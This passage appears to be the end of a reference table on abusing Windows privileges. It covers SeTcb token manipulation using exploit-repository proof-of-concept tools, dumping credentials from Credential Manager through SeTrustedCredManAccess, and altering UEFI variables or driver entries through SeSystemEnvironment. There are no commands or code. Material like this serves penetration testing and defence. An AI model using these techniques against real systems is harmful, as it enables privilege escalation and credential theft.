SeTcb Admin + Manipulate tokens to include admin rights, enabling arbitrary token creation. + Use PoC code or tools from exploit repos to craft tokens. SeTrustedCredManAccess Threat + Dump and access credentials stored in Windows Credential Manager. SeSystemEnvironment Unknown + Manipulate UEFI variables via system calls to alter boot behavior. + Modify driver entries or other environment values."}]}